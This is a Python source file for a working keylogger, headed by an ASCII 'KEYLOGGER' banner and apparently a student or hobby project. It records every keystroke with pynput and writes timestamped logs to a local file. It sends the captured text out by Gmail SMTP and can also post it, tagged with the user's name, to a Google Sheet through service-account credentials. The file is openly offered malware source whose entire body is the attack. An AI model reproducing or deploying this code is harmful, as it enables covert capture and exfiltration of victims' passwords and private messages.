from pynput.keyboard import Key, Listener
from datetime import datetime
import getpass
import smtplib
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from pprint import pprint # stands for pretty print

# reference code form full_2.py
# to add Atribute Error keys -> !!
# check for 2 different mails
# after user hits a certain amount of keys, we'll load that into the txt file, to add, for the first time

count = 0
keys = []
full_log = ""
word = ""
char_limit = 10

email_functionality = True
ghseet_functionality = False

host = getpass.getuser()
print(host)

def write_ghseets(date, time, log):
    if not ghseet_functionality:
        return
    global host
    scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/spreadsheets',
             "https://www.googleapis.com/auth/drive.file", "https://www.googleapis.com/auth/drive"]

    creds = ServiceAccountCredentials.from_json_keyfile_name("../../api/creds.json", scope)
    client = gspread.authorize(creds)
    sheet = client.open("isaa").sheet1

    # data = sheet.get_all_records()
    # pprint(data)

    # to insert an entire row
    logRow = [date, time, host, log]
    sheet.insert_row(logRow, 3)

if email_functionality:
    try:
        email = input("Enter email: ")
        password = getpass.getpass(prompt="Password: ")
    except Exception as E:
        print(E)

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login(email, password)

def send_log():
    if not email_functionality:
        return
    server.sendmail(
        email,
        email,
        full_log
    )

def on_press(key):
    global keys, count, full_log, word, char_limit
    keys.append(key)
    count += 1
    # print("{0} pressed".format(key))

    try:
        # print("{0} pressed".format(key.char))
        if  str(key).find('Key') == -1:
            char = f'{key}'
            char = char[1:-1]
            word += char
        elif key == Key.space:
            word += " "
            full_log += word
            word = ""
        elif key == Key.enter:
            # word += "\n"
            word += " "
            full_log += word
            word = ""
        elif key == Key.backspace:
            pass
            # word = word[:-1]
        else:
            print(f"<<{key}>>")

        if len(full_log) > char_limit:
            write_file(full_log)
            full_log = ""

    except AttributeError:
        pass
    # if count >= 5: # every 5 keys we will update the file
    #     count = 0
    #     write_file(keys)
    #     keys = []

# w for first time, if no file exists, then change it to 'a'
def write_file(full_log):
    # with open("log.txt", "a") as f:
    #     for key in keys:
    #         k = str(key).replace("'", "")
    #         if k.find('space') > 0:
    #             f.write('\n')
    #         elif k.find('Key') == -1:
    #             f.write(k)
    nowObj = datetime.now()

    dateObj = nowObj.date()
    date = dateObj.strftime("%d-%b-%Y")

    timeObj = nowObj.time()
    time = timeObj.strftime("%H:%M:%S.%f")

    with open("log.txt", "a") as file:
        # print(full_log)

        send_log()
        write_ghseets(date, time, full_log)

        full_log = "{}  {}  {}\n".format(date, time, full_log)
        file.write(full_log)
        file.close()

def on_release(key):
    if key == Key.esc:
        return False


print("""
.-. .-')     ('-.                                                               ('-.  _  .-')   
\  ( OO )  _(  OO)                                                            _(  OO)( \( -O )  
,--. ,--. (,------. ,--.   ,--.,--.      .-'),-----.   ,----.      ,----.    (,------.,------.  
|  .'   /  |  .---'  \  `.'  / |  |.-') ( OO'  .-.  ' '  .-./-')  '  .-./-')  |  .---'|   /`. ' 
|      /,  |  |    .-')     /  |  | OO )/   |  | |  | |  |_( O- ) |  |_( O- ) |  |    |  /  | | 
|     ' _)(|  '--.(OO  \   /   |  |`-' |\_) |  |\|  | |  | .--, \ |  | .--, \(|  '--. |  |_.' | 
|  .   \   |  .--' |   /  /\_ (|  '---.'  \ |  | |  |(|  | '. (_/(|  | '. (_/ |  .--' |  .  '.' 
|  |\   \  |  `---.`-./  /.__) |      |    `'  '-'  ' |  '--'  |  |  '--'  |  |  `---.|  |\  \  
`--' '--'  `------'  `--'      `------'      `-----'   `------'    `------'   `------'`--' '--' 
""")

# functions called when a key is pressed or released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    # will constantly keep on running the loop until we break out of it

